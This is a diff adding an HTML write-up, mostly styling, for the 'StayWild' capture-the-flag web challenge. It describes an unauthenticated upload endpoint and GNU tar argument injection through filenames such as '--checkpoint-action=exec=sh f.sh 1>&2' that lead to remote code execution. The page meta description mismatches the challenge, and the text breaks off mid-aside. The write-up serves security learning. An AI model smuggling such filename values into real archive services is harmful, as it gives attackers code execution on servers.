@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>StayWild — Web</title>
+<meta name="description" content="OmniCTF 2026 // Kant writeup // Reverse engineering a 12-layer reversible 36-byte checker, with HUD chrome, live solver, and signal map.">
+<meta name="theme-color" content="#00e5ff">
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23020100'/><text x='50%25' y='58%25' font-family='monospace' font-weight='800' font-size='18' text-anchor='middle' fill='%23ff9d00'>S</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  /* ==========================================================================
+     TORCH-inspired cyberdeck palette
+     ========================================================================== */
+  :root {
+    --accent: #00e5ff;
+    --accent-rgb: 0, 229, 255;
+    --accent-dim: rgba(0, 229, 255, 0.12);
+    --accent-line: rgba(0, 229, 255, 0.24);
+    --root: #ff3030;
+    --bg: #020100;
+    --panel: rgba(5, 5, 5, 0.76);
+    --panel-strong: rgba(8, 7, 6, 0.94);
+    --line: rgba(0, 229, 255, 0.24);
+    --text: #e8e0d5;
+    --muted: #7f766a;
+    --good: #42ff9e;
+    --bad: #ff5a5a;
+    --info: #6bb6ff;
+    --font-mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --font-display: "Rajdhani", system-ui, sans-serif;
+  }
+
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 15px;
+    line-height: 1.6;
+    overflow-x: hidden;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(1200px 600px at 12% -10%, rgba(0,229,255,0.10), transparent 60%),
+      radial-gradient(900px 500px at 110% 10%, rgba(255,48,48,0.06), transparent 70%),
+      repeating-linear-gradient(0deg, rgba(0,229,255,0.025) 0 1px, transparent 1px 3px);
+  }
+  ::selection { background: var(--accent); color: #000; }
+
+  /* ==========================================================================
+     Top HUD bar — mirrors t0rch chrome
+     ========================================================================== */
+  .hud {
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 12px;
+    align-items: center;
+    padding: 10px 18px;
+    background: linear-gradient(180deg, rgba(8,7,6,0.96), rgba(8,7,6,0.78));
+    border-bottom: 1px solid var(--accent-line);
+    backdrop-filter: blur(8px);
+  }
+  .hud .brand {
+    display: flex; align-items: center; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 20px;
+    letter-spacing: 0.18em;
+    color: var(--accent);
+    text-shadow: 0 0 12px rgba(0,229,255,0.35);
+  }
+  .hud .brand .mark {
+    display: inline-grid; place-items: center;
+    width: 28px; height: 28px;
+    border: 1.5px solid var(--accent);
+    box-shadow: 0 0 12px rgba(0,229,255,0.4) inset, 0 0 12px rgba(0,229,255,0.2);
+    font-size: 14px;
+  }
+  .hud .nav { display: flex; gap: 14px; flex-wrap: wrap; justify-content: center; }
+  .hud .nav a {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    color: var(--text);
+    text-decoration: none;
+    padding: 4px 8px;
+    border-bottom: 1px solid transparent;
+    transition: color .15s, border-color .15s;
+  }
+  .hud .nav a:hover { color: var(--accent); border-color: var(--accent); }
+  .hud .nav a.active { color: var(--accent); border-color: var(--accent); }
+  .hud .status {
+    display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
+  }
+  .chip {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 4px 8px;
+    border: 1px solid var(--accent-line);
+    background: var(--accent-dim);
+    color: var(--text);
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .chip.ok { color: var(--good); border-color: rgba(66,255,158,0.4); background: rgba(66,255,158,0.08); }
+  .chip.bad { color: var(--bad); border-color: rgba(255,90,90,0.4); background: rgba(255,90,90,0.08); }
+  .chip .dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: currentColor; margin-right: 6px; vertical-align: middle;
+    box-shadow: 0 0 8px currentColor;
+  }
+
+  /* ==========================================================================
+     Hero / brief
+     ========================================================================== */
+  .brief {
+    max-width: 1180px;
+    margin: 28px auto 12px;
+    padding: 0 18px;
+    display: grid;
+    grid-template-columns: 1.4fr 1fr;
+    gap: 18px;
+  }
+  @media (max-width: 880px) { .brief { grid-template-columns: 1fr; } }
+  .panel {
+    position: relative;
+    background: var(--panel);
+    border: 1px solid var(--accent-line);
+    padding: 18px 20px;
+    backdrop-filter: blur(4px);
+  }
+  .panel::before {
+    content: "";
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  }
+  .panel h1 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 36px;
+    margin: 0 0 6px;
+    color: var(--accent);
+    text-transform: uppercase;
+  }
+  .panel .sub {
+    color: var(--muted);
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+  .panel p { margin: 0 0 12px; }
+  .panel p.lede { font-size: 16px; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 18px; }
+  .grid-2 .row { display: flex; justify-content: space-between; gap: 8px; font-size: 13px; }
+  .grid-2 .k { color: var(--muted); letter-spacing: 0.14em; text-transform: uppercase; font-size: 11px; }
+  .grid-2 .v { color: var(--text); font-weight: 500; }
+  .grid-2 .v.accent { color: var(--accent); }
+
+  /* ==========================================================================
+     Section title
+     ========================================================================== */
+  main { max-width: 1180px; margin: 0 auto; padding: 0 18px 60px; }
+  section { margin: 24px 0; }
+  .sec-head {
+    display: flex; align-items: baseline; gap: 12px;
+    border-bottom: 1px dashed var(--accent-line);
+    padding-bottom: 8px; margin-bottom: 14px;
+  }
+  .sec-head .idx {
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 12px;
+    letter-spacing: 0.24em;
+    color: var(--accent);
+  }
+  .sec-head h2 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 22px;
+    text-transform: uppercase;
+    margin: 0;
+    color: var(--text);
+  }
+  .sec-head .tag {
+    margin-left: auto;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+
+  /* ==========================================================================
+     Content typography
+     ========================================================================== */
+  .prose p { margin: 0 0 12px; }
+  .prose p + p { margin-top: 0; }
+  .prose strong { color: var(--accent); font-weight: 600; }
+  .prose code, .prose tt {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    background: rgba(0,229,255,0.06);
+    border: 1px solid rgba(0,229,255,0.12);
+    padding: 1px 5px;
+    color: #ffd28a;
+  }
+  .prose .terminal {
+    background: #050402;
+    border: 1px solid var(--accent-line);
+    padding: 12px 14px;
+    margin: 10px 0;
+    overflow-x: auto;
+    white-space: pre;
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+  }
+  .prose .terminal .prompt { color: var(--accent); }
+  .prose .terminal .ok { color: var(--good); }
+  .prose .terminal .bad { color: var(--bad); }
+  .prose .terminal .muted { color: var(--muted); }
+  .prose blockquote {
+    margin: 12px 0;
+    padding: 8px 14px;
+    border-left: 2px solid var(--accent);
+    background: rgba(0,229,255,0.04);
+    color: #d6cebf;
+  }
+
+  /* ==========================================================================
+     "Thinking" panel — shows how the solver reasoned
+     ========================================================================== */
+  .think {
+    border: 1px dashed rgba(107, 182, 255, 0.4);
+    background: rgba(107, 182, 255, 0.04);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 13.5px;
+    color: #c7dcf2;
+  }
+  .think::before {
+    content: "// THINKING //";
+    display: block;
+    color: var(--info);
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+  }
+  .think .line { padding-left: 0; margin: 0; }
+  .think .line::before { content: "> "; color: var(--info); }
+  .think .line + .line { margin-top: 4px; }
+
+  /* ==========================================================================
+     Table: forward / inverse layer mapping
+     ========================================================================== */
+  table.layer-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0;
+    font-size: 13px;
+  }
+  table.layer-table th, table.layer-table td {
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    text-align: left;
+    vertical-align: top;
+  }
+  table.layer-table th {
+    background: var(--accent-dim);
+    font-family: var(--font-display);
+    letter-spacing: 0.14em;
+    font-size: 11px;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  table.layer-table td.idx {
+    font-family: var(--font-display);
+    color: var(--accent);
+    width: 40px;
+    text-align: center;
+  }
+  table.layer-table tr:hover td { background: rgba(0,229,255,0.04); }
+
+  /* ==========================================================================
+     Pipeline diagram
+     ========================================================================== */
+  .pipeline {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    align-items: center;
+    padding: 12px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    margin: 10px 0;
+  }
+  .pipeline .stage {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 6px 10px;
+    background: var(--accent-dim);
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 78px;
+  }
+  .pipeline .arrow { color: var(--muted); font-family: var(--font-mono); }
+
+  /* ==========================================================================
+     Live terminal simulator
+     ========================================================================== */
+  .sim {
+    border: 1px solid var(--accent-line);
+    background: #050402;
+    margin: 14px 0 6px;
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+  }
+  .sim .head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--accent-line);
+    background: rgba(0,229,255,0.05);
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  .sim .head .dots { display: flex; gap: 5px; }
+  .sim .head .dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.5; }
+  .sim .head .dots span:nth-child(1) { opacity: 0.3; }
+  .sim .head .dots span:nth-child(3) { opacity: 0.8; }
+  .sim .head .title { color: var(--accent); font-weight: 700; }
+  .sim .body {
+    padding: 12px 14px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+    min-height: 260px;
+    max-height: 420px;
+    overflow: auto;
+    white-space: pre-wrap;
+  }
+  .sim .body .row { display: block; }
+  .sim .body .row .lbl { color: var(--accent); }
+  .sim .body .row .hex { color: #d6cebf; }
+  .sim .body .row.ok .lbl { color: var(--good); }
+  .sim .body .row.flag { color: var(--accent); font-weight: 700; }
+  .sim .controls {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding: 8px 12px;
+    border-top: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.4);
+    align-items: center;
+  }
+  .sim .controls input {
+    flex: 1; min-width: 240px;
+    background: #020100;
+    color: var(--text);
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+  }
+  .sim .controls input:focus { outline: none; border-color: var(--accent); }
+  .sim button {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    padding: 7px 16px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: filter .15s;
+  }
+  .sim button:hover { filter: brightness(1.15); }
+  .sim button.ghost {
+    background: transparent;
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+  }
+
+  /* ==========================================================================
+     Connection map (signal flow)
+     ========================================================================== */
+  .map-legend {
+    display: flex; flex-wrap: wrap; gap: 12px;
+    margin-top: 10px;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .map-legend .item { display: inline-flex; align-items: center; gap: 6px; }
+  .map-legend .swatch { width: 12px; height: 12px; border: 1px solid var(--accent-line); }
+
+  /* ==========================================================================
+     Result panel (flag box)
+     ========================================================================== */
+  .result {
+    border: 1px solid var(--good);
+    background: linear-gradient(180deg, rgba(66,255,158,0.08), rgba(66,255,158,0.02));
+    padding: 16px 20px;
+    margin: 14px 0;
+  }
+  .result .label {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    color: var(--good);
+    font-size: 11px;
+    margin-bottom: 6px;
+  }
+  .result .flag-text {
+    font-family: var(--font-mono);
+    font-size: 18px;
+    color: var(--accent);
+    word-break: break-all;
+    text-shadow: 0 0 14px rgba(0,229,255,0.35);
+  }
+
+  /* ==========================================================================
+     Hex stream decoration
+     ========================================================================== */
+  .hex-stream {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    opacity: 0.5;
+    padding: 6px 18px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .hex-stream.top { border-top: 1px solid var(--accent-line); margin-top: 18px; }
+
+  /* ==========================================================================
+     Bottom HUD strip
+     ========================================================================== */
+  footer.foot {
+    max-width: 1180px;
+    margin: 30px auto 0;
+    padding: 14px 18px 30px;
+    border-top: 1px solid var(--accent-line);
+    display: flex; flex-wrap: wrap; gap: 12px; justify-content: space-between; align-items: center;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  footer.foot .meta { display: flex; gap: 14px; flex-wrap: wrap; }
+
+  /* ==========================================================================
+     Utility
+     ========================================================================== */
+  .row-flex { display: flex; gap: 12px; flex-wrap: wrap; }
+  .col-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 700px) { .col-2 { grid-template-columns: 1fr; } }
+  .muted { color: var(--muted); }
+  .accent { color: var(--accent); }
+  .good { color: var(--good); }
+  .bad { color: var(--bad); }
+  hr.div {
+    border: none; border-top: 1px dashed var(--accent-line); margin: 18px 0;
+  }
+
+  /* Cursor blink for live sim */
+  .blink { animation: blink 1s steps(1) infinite; }
+  /* Reduce motion: disable all of the new animations too */
+  @media (prefers-reduced-motion: reduce) {
+    .blink, .chip .dot, .chip.ok, .result, .think, .sec-head, .hex-stream,
+    .pipeline .stage, .sim .body .row, }
+
+  /* ==========================================================================
+     "Failed attempt" asides — show what the solver tried and discarded
+     ========================================================================== */
+  .aside-fail {
+    border: 1px solid rgba(255, 90, 90, 0.35);
+    background: linear-gradient(180deg, rgba(255,90,90,0.06), rgba(255,90,90,0.02));
+    padding: 10px 14px;
+    margin: 12px 0;
+    font-size: 13.5px;
+    color: #e3c7c7;
+  }
+  .aside-fail .aside-head {
+    display: block;
+    color: #ff7a7a;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+  .aside-fail p { margin: 0 0 8px; }
+  .aside-fail p:last-child { margin-bottom: 0; }
+  .aside-fail p:first-of-type { color: #ffd9d9; }
+
+  /* ==========================================================================
+     Animations
+     ========================================================================== */
+
+  /* HUD status dot pulse */
+  @keyframes pulseDot {
+    0%, 100% { opacity: 1; box-shadow: 0 0 4px currentColor; }
+    50%      { opacity: 0.55; box-shadow: 0 0 12px currentColor; }
+  }
+  .chip .dot { animation: pulseDot 1.8s ease-in-out infinite; }
+
+  /* "ok" chip breathing border */
+  @keyframes pulseOk {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 10px rgba(66,255,158,0.35); }
+  }
+  .chip.ok { animation: pulseOk 2.4s ease-in-out infinite; }
+
+  /* Slow horizontal scanline sweep on body */
+  @keyframes scanSweep {
+    0%   { background-position: 0 0, 0 0, 0 0; }
+    100% { background-position: 0 0, 0 0, 0 6px; }
+  }
+  body { animation: scanSweep 6s linear infinite; }
+
+  /* Decorative hex stream slowly scrolling horizontally */
+  @keyframes hexScroll {
+    0%   { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+  .hex-stream { position: relative; overflow: hidden; }
+  .hex-stream .hex-track {
+    display: inline-block;
+    white-space: nowrap;
+    animation: hexScroll 40s linear infinite;
+  }
+  .hex-stream.top .hex-track {
+    padding-left: 100%;
+  }
+
+  /* Section head fade-in-up */
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .sec-head { animation: fadeInUp 0.5s ease-out both; }
+  .sec-head .idx { animation: fadeInUp 0.5s ease-out 0.1s both; }
+
+  /* Think panels slide in from left when rendered */
+  @keyframes thinkSlide {
+    from { opacity: 0; transform: translateX(-8px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .think { animation: thinkSlide 0.45s ease-out both; }
+
+  /* Pipeline stage hover lift + glow */
+  .pipeline .stage {
+    transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+    cursor: default;
+  }
+  .pipeline .stage:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 14px rgba(0,229,255,0.4);
+    background: rgba(0,229,255,0.18);
+  }
+
+  /* Layer table row glow on hover */
+  table.layer-table tr {
+    transition: background .15s ease, transform .15s ease;
+  }
+  table.layer-table tbody tr:hover {
+    background: rgba(0,229,255,0.06);
+  }
+  table.layer-table tbody tr:hover td.idx {
+    color: #fff;
+    text-shadow: 0 0 10px var(--accent);
+  }
+
+  /* Result box breathing glow */
+  @keyframes breath {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0), inset 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 22px rgba(66,255,158,0.25), inset 0 0 18px rgba(66,255,158,0.06); }
+  }
+  .result { animation: breath 3.4s ease-in-out infinite; }
+
+  /* Sim row reveal animation: each row briefly flashes on appear */
+  @keyframes rowReveal {
+    0%   { opacity: 0; transform: translateX(-6px); background: rgba(66,255,158,0.16); }
+    100% { opacity: 1; transform: translateX(0); background: transparent; }
+  }
+  .sim .body .row {
+    padding: 2px 4px;
+    margin-left: -4px;
+    border-left: 2px solid transparent;
+    transition: background .25s ease, border-color .25s ease;
+    animation: rowReveal 0.4s ease-out both;
+  }
+  .sim .body .row:hover {
+    background: rgba(0,229,255,0.06);
+    border-left-color: var(--accent);
+  }
+  .sim .body .row.flag {
+    background: rgba(66,255,158,0.10);
+    border-left-color: var(--good);
+    border-radius: 2px;
+  }
+  .sim .body .row.flag .flag-ascii { color: var(--good); font-weight: 700; }
+
+  /* Brief success flash when a row is the final flag */
+  @keyframes successFlash {
+    0%   { background: rgba(66,255,158,0.6); }
+    100% { background: rgba(66,255,158,0.1); }
+  }
+  .sim .body .row.flag { animation: rowReveal 0.4s ease-out both, successFlash 1.6s ease-out 0.4s both; }
+
+  /* Connection map */
+  /* Animated dashed flow on edges */
+  /* Info panel for map node details */
+  .info-panel {
+    position: relative;
+    margin-top: 12px;
+    padding: 12px 32px 12px 14px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,229,255,0.04);
+    font-size: 13px;
+    color: var(--text);
+    min-height: 0;
+    max-height: 0;
+    overflow: hidden;
+    opacity: 0;
+    transition: max-height .35s ease, opacity .25s ease, padding .25s ease, margin-top .25s ease;
+    padding-top: 0;
+    padding-bottom: 0;
+    line-height: 1.5;
+  }
+  .info-panel.show {
+    max-height: 480px;
+    opacity: 1;
+    padding-top: 12px;
+    padding-bottom: 12px;
+  }
+  .info-panel .ip-head {
+    display: flex; align-items: baseline; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-size: 12px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+  .info-panel .ip-head .ip-id { color: var(--muted); font-size: 10px; letter-spacing: 0.12em; }
+  .info-panel .ip-head .ip-tag {
+    margin-left: auto;
+    font-size: 9px;
+    padding: 2px 6px;
+    border: 1px solid var(--accent-line);
+    color: var(--muted);
+    background: rgba(0,0,0,0.3);
+  }
+  .info-panel .ip-body p { margin: 0 0 8px; word-wrap: break-word; }
+  .info-panel .ip-body p:last-child { margin-bottom: 0; }
+  .info-panel .ip-body code { font-size: 12.5px; }
+  .info-panel .ip-flows {
+    display: flex; flex-wrap: wrap; gap: 6px;
+    margin-top: 10px;
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .info-panel .ip-flows .label { color: var(--muted); margin-right: 4px; }
+  .info-panel .ip-flows .flow {
+    padding: 3px 8px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    color: var(--text);
+    cursor: pointer;
+    transition: background .12s ease, color .12s ease, border-color .12s ease;
+  }
+  .info-panel .ip-flows .flow:hover {
+    background: var(--accent-dim);
+    color: var(--accent);
+    border-color: var(--accent);
+  }
+  .info-panel .ip-close {
+    position: absolute; top: 6px; right: 10px;
+    background: transparent; color: var(--muted);
+    border: 1px solid var(--accent-line);
+    width: 22px; height: 22px;
+    font-family: var(--font-mono);
+    font-size: 14px;
+    cursor: pointer;
+    line-height: 1;
+    padding: 0;
+  }
+  .info-panel .ip-close:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* Map toolbar */
+  /* Sim toolbar: char counter, copy button */
+  .sim .controls .meta {
+    font-size: 10px; color: var(--muted); letter-spacing: 0.18em; text-transform: uppercase;
+    padding: 0 6px;
+  }
+  .sim .controls .meta.bad { color: var(--bad); }
+  .sim .controls .meta.ok  { color: var(--good); }
+
+  .map-wrap rect.pack { fill: rgba(var(--accent-rgb), 0.02); stroke: var(--accent-line); stroke-width: 1; rx: 5; ry: 5; }
+  .map-wrap text.pack-label { fill: var(--accent); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .24em; text-transform: uppercase; }
+  .map-wrap text.col-label { fill: var(--muted); font: 700 10px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node { cursor: pointer; }
+  .map-wrap g.node rect { fill: rgba(var(--accent-rgb), 0.06); stroke: var(--accent); stroke-width: 1.5; transition: all .2s; }
+  .map-wrap g.node:hover rect { filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), .45)); fill: rgba(var(--accent-rgb), 0.1); }
+  .map-wrap g.node.active rect { stroke-width: 2.5; filter: drop-shadow(0 0 12px rgba(var(--accent-rgb), .7)); fill: rgba(var(--accent-rgb), 0.15); }
+  .map-wrap g.node text.head { fill: var(--muted); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node text.title { fill: var(--accent); font: 700 12px 'Rajdhani', sans-serif; letter-spacing: .12em; text-transform: uppercase; }
+  .map-wrap g.node text.body { fill: var(--text); font: 11px 'JetBrains Mono', monospace; }
+  .map-wrap g.node text.label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; }
+  .map-wrap path.edge { stroke: var(--accent); stroke-width: 1.2; fill: none; opacity: 0.85; marker-end: url(#arr); transition: stroke .3s, opacity .3s; }
+  .map-wrap path.edge.faint { stroke: var(--edge-faint, #8a7e96); stroke-width: 1; fill: none; opacity: 0.5; stroke-dasharray: 3 3; marker-end: url(#arr-faint); }
+  .map-wrap text.edge-label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; text-transform: uppercase; pointer-events: none; }
+  .map-wrap marker path { transition: fill .3s; }
+  .map-wrap path.edge.flowing { stroke: var(--accent); stroke-width: 1.8; opacity: 1; stroke-dasharray: 6 4; animation: flowDash .6s linear infinite; }
+  .map-wrap path.edge.faint.flowing { stroke: var(--accent-dim, #b86bff99); stroke-dasharray: 4 3; }
+  .map-wrap { overflow: hidden; }
+  .map-wrap svg { display:block; width:100%; height:auto; }
+  .map-wrap { width:100%; overflow-x:auto; overflow-y:visible; }
+  .map-wrap { overflow-x:auto; overflow-y:visible; -webkit-overflow-scrolling:touch; }
+  .map-wrap svg { display: block; width: 100%; height: auto; }
+  #map-info, .node-info { margin-top: 10px; padding: 0 14px; border: 1px solid var(--accent-line); background: rgba(var(--accent-rgb), 0.04); font-size: 13px; color: var(--text); max-height: 0; overflow: hidden; opacity: 0; transition: max-height .3s, opacity .2s, padding .25s; line-height: 1.5; }
+  #map-info.show, .node-info.show { max-height: 400px; opacity: 1; padding: 10px 14px; }
+  #map-info .mi-hd { display: flex; align-items: center; gap: 10px; }
+  #map-info .mi-ti { font-family: var(--font-display); font-weight: 800; letter-spacing: .14em; text-transform: uppercase; color: var(--accent); font-size: 11px; }
+  #map-info .mi-tg { margin-left: auto; font-size: 10px; padding: 2px 6px; border: 1px solid var(--accent-line); color: var(--muted); background: rgba(0,0,0,.3); }
+  #map-info .mi-cl { background: transparent; color: var(--muted); border: 1px solid var(--accent-line); padding: 2px 8px; font-family: var(--font-display); font-weight: 700; font-size: 9px; letter-spacing: .14em; text-transform: uppercase; cursor: pointer; }
+  #map-info .mi-cl:hover { color: var(--accent); border-color: var(--accent); }
+  #map-info .mi-bd { margin-top: 6px; word-wrap: break-word; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes flowDash { to { stroke-dashoffset: -10; } }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     TOP HUD
+     ============================================================ -->
+<header class="hud" role="banner">
+  <div class="brand">
+    <span class="mark">K</span>
+    <span>STAYWILD // WRITEUP</span>
+  </div>
+  <nav class="nav" aria-label="Sections">
+    <a href="#recon">recon</a>
+<a href="#intake">intake</a>
+<a href="#injection">injection</a>
+<a href="#sim">sim</a>
+<a href="#signal">signal</a>
+<a href="#flag">flag</a>
+<a href="#solver">solver</a>
+</nav>
+  <div class="status">
+    <span class="chip ok"><span class="dot"></span>solved</span>
+    <span class="chip"><span class="dot"></span>web</span>
+    <span class="chip">OmniCTF</span>
+  </div>
+</header>
+
+<!-- ============================================================
+     HERO / BRIEF
+     ============================================================ -->
+<!-- ============================================================
+     HERO / BRIEF
+     ============================================================ -->
+<section class="brief" id="brief">
+  <div class="panel">
+    <div class="sub">// web // 67 pts // OmniCTF</div>
+    <h1>StayWild</h1>
+    <p class="lede">A forgotten field archive system parsing untrusted filenames directly into GNU tar command line arguments.</p>
+    <p>I discovered a hidden staging endpoint, uploaded crafted tar files containing files named as tar options, and triggered a GNU tar argument injection. The checkpoint feature gave me RCE and I read the base64 encoded flag from the cache.</p>
+    <div class="row-flex" style="margin-top:10px">
+      <span class="chip ok"><span class="dot"></span>flag recovered</span>
+      <span class="chip"><span class="dot"></span>tar injection</span>
+      <span class="chip"><span class="dot"></span>rce</span>
+      <span class="chip bad"><span class="dot"></span>argument parsing</span>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="sub">// challenge matrix</div>
+    <div class="grid-2">
+      <div class="row"><span class="k">visible iface</span><span class="v">/staging, /additional</span></div>
+      <div class="row"><span class="k">vulnerability</span><span class="v accent">Tar Argument Injection</span></div>
+      <div class="row"><span class="k">application</span><span class="v">Express</span></div>
+      <div class="row"><span class="k">target</span><span class="v bad">/additional/&lt;id&gt;</span></div>
+      <div class="row"><span class="k">approach</span><span class="v">plant options, trigger exec</span></div>
+      <div class="row"><span class="k">core idea</span><span class="v">execute shell command via tar checkpoints</span></div>
+      <div class="row"><span class="k">remote</span><span class="v">flag in .cache/seed-574</span></div>
+    </div>
+  </div>
+</section>
+
+<main>
+    <section id="recon">
+      <div class="sec-head">
+        <span class="idx">01 //</span>
+        <h2>reconnaissance</h2>
+        <span class="tag">recon / discovery</span>
+      </div>
+      <div class="panel prose">
+        <p>The site is a Wildlife Archive served by Express behind Nginx. The homepage sets a visitor cookie, but the visitor notes form relies entirely on client-side localStorage. A quick check of <code>robots.txt</code> mentions field archive tooling.</p>
+        <p>Running a quick directory sweep uncovers a hidden <code>/staging</code> endpoint.</p>
+      </div>
+    </section>
+
+    <section id="intake">
+      <div class="sec-head">
+        <span class="idx">02 //</span>
+        <h2>archive intake flow</h2>
+        <span class="tag">analysis</span>
+      </div>
+      <div class="panel prose">
+        <p>The <code>/staging</code> endpoint accepts a <code>.tar</code> upload. The server creates a unique workspace directory, extracts the tar file there, and displays an extraction log page along with the current workspace files.</p>
+        <p>The page also exposes a <code>/additional/&lt;id&gt;</code> endpoint to upload more files to the same workspace. A client-side comment claims this is "Only for admins," but the server accepted my requests without enforcing authorization.</p>
+      </div>
+    </section>
+
+    <section id="injection">
+      <div class="sec-head">
+        <span class="idx">03 //</span>
+        <h2>tar argument injection</h2>
+        <span class="tag">exploit / rce</span>
+      </div>
+      <div class="panel prose">
+        <p>The extraction logs echo the raw output from GNU <code>tar</code>. On each additional upload pass, the server passes every existing workspace filename as a command-line argument to the tar command.</p>
+        <p>Since I controlled the filenames created in my workspace through my tar uploads, I was able to plant files literally named <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=sh f.sh 1&gt;&amp;2</code>. I included a script file <code>f.sh</code> containing my shell commands.</p>
+        <div class="aside-fail">
+          <span class="aside-head">Dead End: Directory Traversal</span>
